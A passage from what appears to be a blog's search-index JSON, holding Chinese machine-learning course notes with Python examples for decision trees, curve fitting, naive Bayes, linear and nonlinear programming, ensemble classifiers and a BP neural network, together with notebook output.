export_graphviziris = load_iris()X = iris.data[:, 2:] # petal length and widthy = iris.targettree_clf = DecisionTreeClassifier(max_depth=3)tree_clf.fit(X, y)export_graphviz( tree_clf, out_file=&quot;tree.dot&quot;, feature_names=iris.feature_names[2:], class_names=iris.target_names, rounded=True, filled=True)","categories":[{"name":"机器学习课程(魏)","slug":"机器学习课程-魏","permalink":"http://example.com/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B-%E9%AD%8F/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"拟合","slug":"机器学习/机器学习课程(魏)/拟合","date":"2021-11-08T07:02:54.000Z","updated":"2021-12-08T08:51:02.872Z","comments":true,"path":"2021/11/08/机器学习/机器学习课程(魏)/拟合/","link":"","permalink":"http://example.com/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/%E6%8B%9F%E5%90%88/","excerpt":"","text":"12345import numpy as npimport matplotlib.pyplot as pltimport numpy.linalg as lgfrom sklearn.linear_model import LinearRegressionfrom sklearn.preprocessing import PolynomialFeatures as pl 123456789101112131415161718192021x=np.linspace(-20,20,50)y=2*x+0.2*x**2+1+np.random.uniform(-5,5,x.shape)plt.figureplt.plot(x,y,&#x27;k*&#x27;)A=np.c_[x**2,x,np.ones(x.shape)]B=y.reshape(y.shape[0],1)eta=0.00001n=10000m=x.shape[0]arf=np.random.randn(3,1)*2for i in range(n): gradients=2/m*A.T.dot(A.dot(arf)-B) arf=arf-eta*gradientsw=lg.inv(A.T.dot(A)).dot(A.T).dot(y)plt.plot(x,x**2*arf[0]+x*arf[1]+arf[2])plt.show() ​ ​ 1234567891011121314t=np.arange(1,17,1)y=np.array([4,6.4,8,8.8,9.22,9.5,9.7,9.86,10,10.20,10.32,10.42,10.5,10.55,10.58,10.6])plt.figure()plt.plot(t,y,&#x27;k*&#x27;)# y=at^2+bt+cA=np.c_[t**2,t,np.ones(t.shape)]w=lg.inv(A.T.dot(A)).dot(A.T).dot(y)plt.plot(t,w[0]*t**2+w[1]*t+w[2])plt.show() ​ ​ 12345678910111213t=np.arange(1,17,1)t=t.reshape(-1,1)y=np.array([4,6.4,8,8.8,9.22,9.5,9.7,9.86,10,10.20,10.32,10.42,10.5,10.55,10.58,10.6])plt.figure()plt.plot(t,y,&#x27;k*&#x27;)# y=at^2+bt+clin_reg=LinearRegression()lin_reg.fit(t,y)plt.plot(t,lin_reg.predict(t).reshape(-1,1))plt.show() ​ ​ 12345678910111213141516t=np.arange(1,17,1)t=t.reshape(-1,1)y=np.array([4,6.4,8,8.8,9.22,9.5,9.7,9.86,10,10.20,10.32,10.42,10.5,10.55,10.58,10.6])plt.figure()plt.plot(t,y,&#x27;k*&#x27;)# y=at^2+bt+cpoly_features=pl(degree=2,include_bias=False)x_poly=poly_features.fit_transform(t)lin_reg=LinearRegression()lin_reg.fit(x_poly,y)plt.plot(t,lin_reg.coef_[1]*t**2+lin_reg.coef_[0]*t+lin_reg.intercept_)plt.show() ​ ​ 1","categories":[{"name":"机器学习课程(魏)","slug":"机器学习课程-魏","permalink":"http://example.com/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B-%E9%AD%8F/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"朴素贝叶斯","slug":"机器学习/机器学习课程(魏)/朴素贝叶斯","date":"2021-11-08T07:02:54.000Z","updated":"2021-12-08T08:51:24.574Z","comments":true,"path":"2021/11/08/机器学习/机器学习课程(魏)/朴素贝叶斯/","link":"","permalink":"http://example.com/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF/","excerpt":"","text":"123456789101112131415161718from scipy.io import loadmatimport numpy as npfrom sklearn.naive_bayes import BernoulliNB #伯努利分布,适用于离散型数据from sklearn.naive_bayes import GaussianNB #高斯分布，适用于连续型数据from sklearn.naive_bayes import MultinomialNB #多项式分布from sklearn.model_selection import train_test_splitmnist=loadmat(&#x27;mnist-original.mat&#x27;)x,y=mnist[&quot;data&quot;],mnist[&quot;label&quot;]x=x.Ty=y[0]x_train,x_test,y_train,y_test=train_test_split(x,y,random_state=5)nb=BernoulliNB()nb.fit(x_train,y_train)a=nb.score(x_test,y_test)print(a) 0.828 123456789101112131415161718192021222324import matplotlib.pyplot as pltimport numpy as npfrom sklearn.naive_bayes import BernoulliNB #伯努利分布,适用于离散型数据from sklearn.naive_bayes import GaussianNB #高斯分布，适用于连续型数据from sklearn.naive_bayes import MultinomialNB #多项式分布，from sklearn.model_selection import train_test_splitfrom sklearn.datasets import make_blobsx, y= make_blobs(n_samples = 1000, #生成300条数据 centers =5, #5类数据 cluster_std = 0.7, #方差一致 random_state = 8) #随机数种子nb=GaussianNB()nb.fit(x,y)z=nb.predict(x)a=nb.score(x,y)print(a)plt.figure()plt.scatter(x[:,0], x[:,1],c=y)plt.figure()plt.scatter(x[:,0], x[:,1],c=z)plt.show() 0.982 12345678910111213141516171819202122232425262728293031import numpy as npimport pandas as pdfrom sklearn.datasets import make_moonsimport matplotlib.pyplot as pltfrom sklearn.naive_bayes import BernoulliNB #伯努利分布,适用于离散型数据from sklearn.naive_bayes import GaussianNB #高斯分布，适用于连续型数据from sklearn.naive_bayes import MultinomialNB #多项式分布from sklearn.model_selection import cross_val_score as cr#调用交叉检验函数n_samples = 600x,y=make_moons(n_samples=n_samples, noise=0.1,random_state=8)x=x+2;#clf= MultinomialNB()clf= GaussianNB()clf.fit(x,y)#clf.predict([x])xmin,xmax=x[:,0].min()-1,x[:,0].max()+1ymin,ymax=x[:,1].min()-1,x[:,1].max()+1xx,yy=np.meshgrid(np.arange(xmin,xmax,0.02),np.arange(ymin,ymax,0.02))xf=np.c_[xx.ravel(),yy.ravel()];z=clf.predict(xf)z=z.reshape(xx.shape)plt.pcolormesh(xx,yy,z,cmap=plt.cm.Pastel1)plt.scatter(x[:,0],x[:,1],c=y)print(cr(clf,x,y,cv=5,scoring=&quot;accuracy&quot;))plt.show() [0.9 0.88333333 0.9 0.85833333 0.86666667] c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\ipykernel_launcher.py:25: MatplotlibDeprecationWarning: shading='flat' when X and Y have the same dimensions as C is deprecated since 3.3. Either specify the corners of the quadrilaterals with X and Y, or pass shading='auto', 'nearest' or 'gouraud', or set rcParams['pcolor.shading']. This will become an error two minor releases later. 1","categories":[{"name":"机器学习课程(魏)","slug":"机器学习课程-魏","permalink":"http://example.com/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B-%E9%AD%8F/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"线性规划","slug":"机器学习/机器学习课程(魏)/线性规划","date":"2021-11-08T07:02:54.000Z","updated":"2021-12-08T08:52:09.583Z","comments":true,"path":"2021/11/08/机器学习/机器学习课程(魏)/线性规划/","link":"","permalink":"http://example.com/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/%E7%BA%BF%E6%80%A7%E8%A7%84%E5%88%92/","excerpt":"","text":"123from scipy import optimize as opimport numpy as np scipy.optimize.linprog(c, A_ub=None, b_ub=None, A_eq=None, b_eq=None, bounds=None, method=‘simplex’, callback=None, options=None) 很容易发现，c 指的应该是要求最大值的函数的系数数组，A_ub 是应该是不等式未知量的系数矩阵，仔细观察的人应该发现，为什么第一行里面写的是 [-2,5,-1] 而不是 [2,5,-1] 呢，应该要与图里对应才对啊，原来这不等式指的是 &lt;= 的不等式，那如果是 &gt;= 呢，乘个负号就行了。A_eq 就是其中等式的未知量系数矩阵了。B_ub 就是不等式的右边了，B_eq 就是等式右边了。bounds 的话，指的就是每个未知量的范围了 12345678910111213141516171819#目标函数，求最大值c=np.array([2,3,-5])#unbalence不等式，默认&lt;=，&gt;=乘-1#不等式左系数矩阵A_ub=np.array([[-2,5,-1],[1,3,1]])#不等式右系数矩阵B_ub=np.array([-10,12])#equation等式，A_eq为左系数矩阵，B_eq为右系数矩阵A_eq=np.array([[1,1,1]])#注意双括号B_eq=np.array([7])#x1,x2,x3大于等于0x1=(0,None)x2=(0,None)x3=(0,None)#函数默认求最小值，-c，结果为负号res=op.linprog(-c,A_ub,B_ub,A_eq,B_eq,bounds=(x1,x2,x3))print(res) con: array([1.80713489e-09]) fun: -14.571428565645059 message: 'Optimization terminated successfully.' nit: 5 slack: array([-2.24614993e-10, 3.85714286e+00]) status: 0 success: True x: array([6.42857143e+00, 5.71428571e-01, 2.35900788e-10]) 12x = [6.42857143e+00, 5.71428571e-01, 2.35900788e-10]print(2*x[0] + 3*x[1] -5*x[2]) 14.571428571820496","categories":[{"name":"机器学习课程(魏)","slug":"机器学习课程-魏","permalink":"http://example.com/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B-%E9%AD%8F/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"随机森林","slug":"机器学习/机器学习课程(魏)/随机森林","date":"2021-11-08T07:02:54.000Z","updated":"2021-12-08T08:51:49.040Z","comments":true,"path":"2021/11/08/机器学习/机器学习课程(魏)/随机森林/","link":"","permalink":"http://example.com/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97/","excerpt":"","text":"1234567891011121314151617181920#beggingimport numpy as npfrom sklearn.datasets import make_moonsfrom sklearn.metrics import accuracy_scoreimport matplotlib.pyplot as pltfrom sklearn.ensemble import BaggingClassifierfrom sklearn.tree import DecisionTreeClassifiern_samples = 2000X_train, y_train=make_moons(n_samples=n_samples, noise=.3,random_state=8)bag_clf = BaggingClassifier(DecisionTreeClassifier(), n_estimators=500,max_samples=100, bootstrap=True, n_jobs=-1)bag_clf.fit(X_train[0:1500], y_train[0:1500])y_pred = bag_clf.predict(X_train[1500:])print(accuracy_score(y_train[1500:], y_pred))plt.figure();plt.scatter(X_train[:,0],X_train[:,1],c=y_train)plt.show() 0.9 123456789101112131415161718192021#RandomForestimport numpy as npfrom sklearn.datasets import make_moonsfrom sklearn.metrics import accuracy_scoreimport matplotlib.pyplot as pltfrom sklearn.ensemble import RandomForestClassifierfrom sklearn.tree import DecisionTreeClassifiern_samples = 2000X_train, y_train=make_moons(n_samples=n_samples, noise=.3,random_state=8)ada_clf = RandomForestClassifier(n_estimators=500,max_leaf_nodes=16,n_jobs=-1)ada_clf.fit(X_train[0:1500], y_train[0:1500])y_pred = ada_clf.predict(X_train[1500:])print(accuracy_score(y_train[1500:], y_pred))plt.figure();plt.scatter(X_train[:,0],X_train[:,1],c=y_train)plt.show() 0.904 123456789101112131415161718192021222324#Boostimport numpy as npfrom sklearn.datasets import make_moonsfrom sklearn.metrics import accuracy_scoreimport matplotlib.pyplot as pltfrom sklearn.ensemble import AdaBoostClassifierfrom sklearn.tree import DecisionTreeClassifiern_samples = 2000X_train, y_train=make_moons(n_samples=n_samples, noise=.3,random_state=8)ada_clf = AdaBoostClassifier(DecisionTreeClassifier(max_depth=1), n_estimators=500,algorithm=&quot;SAMME.R&quot;, learning_rate=0.5)ada_clf.fit(X_train[0:1500], y_train[0:1500])y_pred = ada_clf.predict(X_train[1500:])print(accuracy_score(y_train[1500:], y_pred))plt.figure();plt.scatter(X_train[:,0],X_train[:,1],c=y_train)plt.show() 0.892 1234567891011121314151617181920212223242526272829#Stackingfrom sklearn import datasetsfrom sklearn import model_selectionfrom sklearn.linear_model import LogisticRegressionfrom sklearn.neighbors import KNeighborsClassifierfrom sklearn.naive_bayes import GaussianNBfrom sklearn.ensemble import RandomForestClassifierfrom mlxtend.classifier import StackingClassifierimport numpy as npiris = datasets.load_iris()X, y = iris.data[:, 1:3], iris.targetclf1 = KNeighborsClassifier(n_neighbors=1)clf2 = RandomForestClassifier(random_state=1)clf3 = GaussianNB()lr = LogisticRegression()sclf = StackingClassifier(classifiers=[clf1, clf2, clf3], meta_classifier=lr)print(&#x27;3-fold cross validation:\\n&#x27;)for clf, label in zip( [clf1, clf2, clf3, sclf], [&#x27;KNN&#x27;, &#x27;Random Forest&#x27;, &#x27;Naive Bayes&#x27;, &#x27;StackingClassifier&#x27;]): scores = model_selection.cross_val_score(clf, X, y, cv=3, scoring=&#x27;accuracy&#x27;) print(&quot;Accuracy: %0.2f (+/- %0.2f) [%s]&quot; % (scores.mean(), scores.std(), label)) --------------------------------------------------------------------------- ModuleNotFoundError Traceback (most recent call last) &lt;ipython-input-4-483486e68139&gt; in &lt;module&gt; 6 from sklearn.naive_bayes import GaussianNB 7 from sklearn.ensemble import RandomForestClassifier ----&gt; 8 from mlxtend.classifier import StackingClassifier 9 import numpy as np 10 ModuleNotFoundError: No module named 'mlxtend' 1!pip install mlxtend Looking in indexes: http://mirrors.aliyun.com/pypi/simple/ ERROR: Could not find a version that satisfies the requirement mlxtend (from versions: none) ERROR: No matching distribution found for mlxtend 12345678910111213141516171819202122232425262728293031323334#Votingimport numpy as npfrom sklearn.datasets import make_moons#生成月牙形数据from sklearn.metrics import accuracy_score#分类器的准确率import matplotlib.pyplot as plt#画图from sklearn.ensemble import VotingClassifier#调用集成学习的投票分类器from sklearn.linear_model import LogisticRegression#调用逻辑回归分类器from sklearn.svm import SVC#调用支持向量机分类器from sklearn.neighbors import KNeighborsClassifier#调用KNN分类器n_samples = 2000X_train, y_train=make_moons(n_samples=n_samples, noise=.3,random_state=8)#shuffle_index=np.random.permutation(2000)log_clf = LogisticRegression()svm_clf = SVC()knn_clf=KNeighborsClassifier()voting_clf = VotingClassifier(estimators=[(&#x27;lr&#x27;, log_clf),(&#x27;svc&#x27;, svm_clf),(&#x27;knn&#x27;,knn_clf)],voting=&#x27;hard&#x27;)#voting_clf.fit(X_train[0:1500], y_train[0:1500])for clf in (log_clf,svm_clf,knn_clf,voting_clf): clf.fit(X_train[0:1500], y_train[0:1500]) y_pred = clf.predict(X_train[1500:]) print(clf.__class__.__name__, accuracy_score(y_train[1500:], y_pred))plt.figure();plt.scatter(X_train[:,0],X_train[:,1],c=y_train)plt.show() LogisticRegression 0.862 SVC 0.906 KNeighborsClassifier 0.902 VotingClassifier 0.91 1","categories":[{"name":"机器学习课程(魏)","slug":"机器学习课程-魏","permalink":"http://example.com/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B-%E9%AD%8F/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"非线性规划","slug":"机器学习/机器学习课程(魏)/非线性规划","date":"2021-11-08T07:02:54.000Z","updated":"2021-12-08T08:50:17.549Z","comments":true,"path":"2021/11/08/机器学习/机器学习课程(魏)/非线性规划/","link":"","permalink":"http://example.com/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/%E9%9D%9E%E7%BA%BF%E6%80%A7%E8%A7%84%E5%88%92/","excerpt":"","text":"12345678910111213def minimize(fun: Callable, x0: ndarray, args: Union[Iterable, tuple, None] = (), method: Union[str, Callable, None] = None, jac: Union[Callable, str, bool, None] = None, hess: str = None, hessp: Optional[Callable] = None, bounds: Union[Iterable, Bounds, None] = None, constraints: Optional[dict] = (), tol: Optional[float] = None, callback: Optional[Callable] = None, options: Optional[dict] = None) -&gt; Any#Minimization of scalar function of one or more variables. 123456789101112131415161718192021222324252627282930313233343536373839from scipy import optimize as optimport numpy as npfrom scipy.optimize import minimize# 目标函数def objective(x): return x[0] ** 2 + x[1]**2 + x[2]**2 +8# 约束条件，&gt;=以及=def constraint1(x): return x[0] ** 2 - x[1] + x[2]**2 # 不等约束def constraint2(x): return -(x[0] + x[1]**2 + x[2]**2-20) # 不等约束，默认&gt;=，这里是&lt;=,加上负号def constraint3(x): return -x[0] - x[1]**2 + 2def constraint4(x): return x[1] + 2*x[2]**2 -3 # 不等约束# 边界约束，都大于零b = (0.0, None)bnds = (b, b ,b) con1 = &#123;&#x27;type&#x27;: &#x27;ineq&#x27;, &#x27;fun&#x27;: constraint1&#125;#不等约束&gt;=con2 = &#123;&#x27;type&#x27;: &#x27;ineq&#x27;, &#x27;fun&#x27;: constraint2&#125;#不等约束&gt;=con3 = &#123;&#x27;type&#x27;: &#x27;eq&#x27;, &#x27;fun&#x27;: constraint3&#125;#相等约束con4 = &#123;&#x27;type&#x27;: &#x27;eq&#x27;, &#x27;fun&#x27;: constraint4&#125;#相等约束cons = ([con1, con2, con3,con4]) # 4个约束条件# 计算#定义初始值#x0 = ([0, 0, 0])#使用函数minimize求解最小值，传入参数：objective目标函数，x0初始值，method使用QP问题解决方法，bounds取值范围，constraints约束套件solution = minimize(objective, x0, method=&#x27;SLSQP&#x27;, bounds=bnds, constraints=cons)x = solution.xprint(solution)print(&#x27;目标值: &#x27; + str(objective(x)))print(&#x27;答案为&#x27;)print(&#x27;x1 = &#x27; + str(x[0]))print(&#x27;x2 = &#x27; + str(x[1])) fun: 10.651091840572583 jac: array([1.10433471, 2.40651834, 1.89564812]) message: 'Optimization terminated successfully' nfev: 71 nit: 15 njev: 15 status: 0 success: True x: array([0.55216734, 1.20325918, 0.94782404]) 目标值: 10.651091840572583 答案为 x1 = 0.5521673412903173 x2 = 1.203259181851855 1","categories":[{"name":"机器学习课程(魏)","slug":"机器学习课程-魏","permalink":"http://example.com/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B-%E9%AD%8F/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"基于BP神经网络的预测","slug":"机器学习/天池/基于BP神经网络的预测","date":"2021-11-08T07:02:54.000Z","updated":"2021-12-08T08:26:44.044Z","comments":true,"path":"2021/11/08/机器学习/天池/基于BP神经网络的预测/","link":"","permalink":"http://example.com/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%A4%A9%E6%B1%A0/%E5%9F%BA%E4%BA%8EBP%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%9A%84%E9%A2%84%E6%B5%8B/","excerpt":"","text":"# 机器学习算法（八）：基于 BP 神经网络的预测 ¶ # 1. 前言：算法简介和应用 # 1.1. 算法简介 BP（Back Propagation）网络是 1986 年由 Rumelhart 和 McCelland 为首的科学家小组提出，是一种按误差逆传播算法训练的多层前馈网络，是目前应用最广泛的神经网络模型之一。BP 网络能学习和存贮大量的输入 - 输出模式映射关系，而无需事前揭示描述这种映射关系的数学方程。它的学习规则是使用最速下降法，通过反向传播来不断调整网络的权值和阈值，使网络的误差平方和最小。BP 神经网络模型拓扑结构包括输入层（input）、隐层 (hide layer) 和输出层 (output layer)。在模拟过程中收集系统所产生的误差，通过误差反传，然后调整权值大小，通过该不断迭代更新，最后使得模型趋于整体最优化（这是一个循环，我们在训练神经网络的时候是要不断的去重复这个过程的）。 BP 神经网络具有以下优点： 非线性映射能力：BP 神经网络实质上实现了一个从输入到输出的映射功能，数学理论证明三层的神经网络就能够以任意精度逼近任何非线性连续函数。这使得其特别适合于求解内部机制复杂的问题，即 BP 神经网络具有较强的非线性映射能力。 自学习和自适应能力：BP 神经网络在训练时，能够通过学习自动提取输入、输出数据间的 “合理规则”，并自适应地将学习内容记忆于网络的权值中。即 BP 神经网络具有高度自学习和自适应的能力。 泛化能力：所谓泛化能力是指在设计模式分类器时，即要考虑网络在保证对所需分类对象进行正确分类，还要关心网络在经过训练后，能否对未见过的模式或有噪声污染的模式，进行正确的分类。也即 BP 神经网络具有将学习成果应用于新知识的能力。 BP 神经网络具有以下缺点点： 局部极小化问题：从数学角度看，传统的 BP 神经网络为一种局部搜索的优化方法，它要解决的是一个复杂非线性化问题，网络的权值是通过沿局部改善的方向逐渐进行调整的，这样会使算法陷入局部极值，权值收敛到局部极小点，从而导致网络训练失败。加上 BP 神经网络对初始网络权重非常敏感，以不同的权重初始化网络，其往往会收敛于不同的局部极小，这也是每次训练得到不同结果的根本原因。 BP 神经网络算法的收敛速度慢：由于 BP 神经网络算法本质上为梯度下降法，它所要优化的目标函数是非常复杂的，因此，必然会出现 “锯齿形现象”，这使得 BP 算法低效；又由于优化的目标函数很复杂，它必然会在神经元输出接近 0 或 1 的情况下，出现一些平坦区，在这些区域内，权值误差改变很小，使训练过程几乎停顿；BP 神经网络模型中，为了使网络执行 BP 算法，不能使用传统的一维搜索法求每次迭代的步长，而必须把步长的更新规则预先赋予网络，这种方法也会引起算法低效。以上种种，导致了 BP 神经网络算法收敛速度慢的现象。 BP 神经网络结构选择不一：BP 神经网络结构的选择至今尚无一种统一而完整的理论指导，一般只能由经验选定。网络结构选择过大，训练中效率不高，可能出现过拟合现象，造成网络性能低，容错性下降，若选择过小，则又会造成网络可能不收敛。而网络的结构直接影响网络的逼近能力及推广性质。因此，应用中如何选择合适的网络结构是一个重要的问题。 # 1.2. 算法应用 BP 反映了生物神经系统处理外界事物的基本过程，是在模拟人脑神经组织的基础上发展起来的计算系统，是由大量处理单元通过广泛互联而构成的网络体系，它具有生物神经系统的基本特征，在一定程度上反映了人脑功能的若干反映，是对生物系统的某种模拟，具有大规模并行、分布式处理、自组织、自学习等优点，被广泛应用于语音分析、图像识别、数字水印、计算机视觉等很多领域，取得了许多突出的成果。最近由于人工神经网络的快速发展，它已经成为模式识别的强有力的工具。神经网络的运用展开了新的领域，解决其它模式识别不能解决的问题，其分类功能特别适合于模式识别与分类的应用。 # 2. 学习目标 掌握 BP 算法基本原理 掌握利用 BP 进行代码实战 # 3. 代码流程 Part 1 Demo 实践 Step1: 库函数导入 Step2: 模型训练 Step3: 模型参数查看 Step4: 数据和模型可视化 Step5: 模型预测 Part 2 基于 BP 神经网络的乳腺癌分类实践 Step1: 库函数导入 Step2: 数据读取 / 载入 Step3: 数据信息简单查看与可视化 Step4: 利用 BP 神经网络在乳腺癌数据上进行训练和预测 # 4. 代码实战 # Part 1 Demo 实践 Step1: 库函数导入 1234567891011121314# 基础数组运算库导入import numpy as np # 画图库导入import matplotlib.pyplot as plt # 导入三维显示工具from mpl_toolkits.mplot3d import Axes3D# 导入BP模型from sklearn.neural_network import MLPClassifier# 导入demo数据制作方法from sklearn.datasets import make_classificationfrom sklearn.metrics import classification_report, confusion_matriximport seaborn as snsimport warningsfrom sklearn.exceptions import ConvergenceWarning Step2: 模型训练 123456789# 制作五个类别的数据，每个类别1000个样本train_samples, train_labels = make_classification(n_samples=1000, n_features=3, n_redundant=0, n_classes=5, n_informative=3, n_clusters_per_class=1, class_sep=3, random_state=10)# 将五个类别的数据进行三维显示fig = plt.figure()ax = Axes3D(fig, rect=[0, 0, 1, 1], elev=20, azim=20)ax.scatter(train_samples[:, 0], train_samples[:, 1], train_samples[:, 2], marker=&#x27;o&#x27;, c=train_labels)plt.title(&#x27;Demo Data Map&#x27;) c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\ipykernel_launcher.py:7: MatplotlibDeprecationWarning: Axes3D(fig) adding itself to the figure is deprecated since 3.4. Pass the keyword argument auto_add_to_figure=False and use fig.add_axes(ax) to suppress this warning. The default value of auto_add_to_figure will change to False in mpl3.5 and True values will no longer work in 3.6. This is consistent with other Axes classes. import sys Text(0.5, 0.92, 'Demo Data Map') ​ ​ 1234567# 建立 BP 模型, 采用sgd优化器，relu非线性映射函数BP = MLPClassifier(solver=&#x27;sgd&#x27;,activation = &#x27;relu&#x27;,max_iter = 500,alpha = 1e-3,hidden_layer_sizes = (32,32),random_state = 1)# 进行模型训练with warnings.catch_warnings(): warnings.filterwarnings(&quot;ignore&quot;, category=ConvergenceWarning, module=&quot;sklearn&quot;) BP.fit(train_samples, train_labels) Step3: 模型参数查看 12# 查看 BP 模型的参数print(BP) MLPClassifier(alpha=0.001, hidden_layer_sizes=(32, 32), max_iter=500, random_state=1, solver='sgd') Step4: 数据和模型可视化 123456789101112131415161718192021222324252627282930# 进行模型预测predict_labels = BP.predict(train_samples)# 显示预测的散点图fig = plt.figure()ax = Axes3D(fig, rect=[0, 0, 1, 1], elev=20, azim=20)ax.scatter(train_samples[:, 0], train_samples[:, 1], train_samples[:, 2], marker=&#x27;o&#x27;, c=predict_labels)plt.title(&#x27;Demo Data Predict Map with BP Model&#x27;)# 显示预测分数print(&quot;预测准确率: &#123;:.4f&#125;&quot;.format(BP.score(train_samples, train_labels)))# 可视化预测数据 print(&quot;真实类别：&quot;, train_labels[:10])print(&quot;预测类别：&quot;, predict_labels[:10])# 准确率等报表print(classification_report(train_labels, predict_labels))# 计算混淆矩阵classes = [0, 1, 2, 3]cofusion_mat = confusion_matrix(train_labels, predict_labels, classes) sns.set()figur, ax = plt.subplots()# 画热力图sns.heatmap(cofusion_mat, cmap=&quot;YlGnBu_r&quot;, annot=True, ax=ax) ax.set_title(&#x27;confusion matrix&#x27;) # 标题ax.set_xticklabels([&#x27;&#x27;] + classes, minor=True)ax.set_yticklabels([&#x27;&#x27;] + classes, minor=True)ax.set_xlabel(&#x27;predict&#x27;) # x轴ax.set_ylabel(&#x27;true&#x27;) # y轴plt.show() c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\ipykernel_launcher.py:5: MatplotlibDeprecationWarning: Axes3D(fig) adding itself to the figure is deprecated since 3.4. Pass the keyword argument auto_add_to_figure=False and use fig.add_axes(ax) to suppress this warning. The default value of auto_add_to_figure will change to False in mpl3.5 and True values will no longer work in 3.6. This is consistent with other Axes classes. &quot;&quot;&quot; c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\sklearn\\utils\\validation.py:72: FutureWarning: Pass labels=[0, 1, 2, 3] as keyword args. From version 1.0 (renaming of 0.25) passing these as positional arguments will result in an error &quot;will result in an error&quot;, FutureWarning) c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\ipykernel_launcher.py:26: UserWarning: FixedFormatter should only be used together with FixedLocator c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\ipykernel_launcher.py:27: UserWarning: FixedFormatter should only be used together with FixedLocator 预测准确率: 0.9950 真实类别： [0 4 2 2 3 2 3 0 1 0] 预测类别： [0 4 2 2 3 2 3 0 1 0] precision recall f1-score support 0 0.98 0.99 0.99 198 1 1.00 0.99 0.99 203 2 1.00 1.00 1.00 200 3 0.99 1.00 1.00 199 4 0.99 0.99 0.99 200 accuracy 0.99 1000 macro avg 0.99 1.00 0.99 1000 weighted avg 1.00 0.99 1.00 1000 ​ ​ ​ Step5: 模型预测 12345678910111213141516# 进行新的测试数据测试test_sample = np.array([[-1, 0.1, 0.1]])print(f&quot;&#123;test_sample&#125; 类别是: &quot;, BP.predict(test_sample))print(f&quot;&#123;test_sample&#125; 类别概率分别是: &quot;, BP.predict_proba(test_sample))test_sample = np.array([[-1.2, 10, -91]])print(f&quot;&#123;test_sample&#125; 类别是: &quot;, BP.predict(test_sample))print(f&quot;&#123;test_sample&#125; 类别概率分别是: &quot;, BP.predict_proba(test_sample))test_sample = np.array([[-12, -0.1, -0.1]])print(f&quot;&#123;test_sample&#125; 类别是: &quot;, BP.predict(test_sample))print(f&quot;&#123;test_sample&#125; 类别概率分别是: &quot;, BP.predict_proba(test_sample))test_sample = np.array([[100, -90.1, -9.1]])print(f&quot;&#123;test_sample&#125; 类别是: &quot;, BP.predict(test_sample))print(f&quot;&#123;test_sample&#125; 类别概率分别是: &quot;, BP.predict_proba(test_sample)) [[-1. 0.1 0.1]] 类别是: [4] [[-1. 0.1 0.1]] 类别概率分别是: [[0.08380116 0.1912275 0.17608601 0.16488309 0.38400224]] [[ -1.2 10. -91. ]] 类别是: [1] [[ -1.2 10. -91. ]] 类别概率分别是: [[3.37231505e-30 1.00000000e+00 4.24566351e-51 1.92771500e-57 5.16916174e-17]] [[-12. -0.1 -0.1]] 类别是: [4] [[-12. -0.1 -0.1]] 类别概率分别是: [[1.42696980e-06 5.86057194e-05 2.99819240e-05 3.03896335e-05 9.99879596e-01]] [[100. -90.1 -9.1]] 类别是: [2] [[100. -90.1 -9.1]] 类别概率分别是: [[2.45024178e-02 8.44965777e-67 9.75497582e-01 1.41511057e-66 4.23516105e-50]] # Part 2 基于 BP 神经网络的乳腺癌分类实践 Step1: 库函数导入 1234567891011# 导入乳腺癌数据集from sklearn.datasets import load_breast_cancer# 导入BP模型from sklearn.neural_network import MLPClassifier# 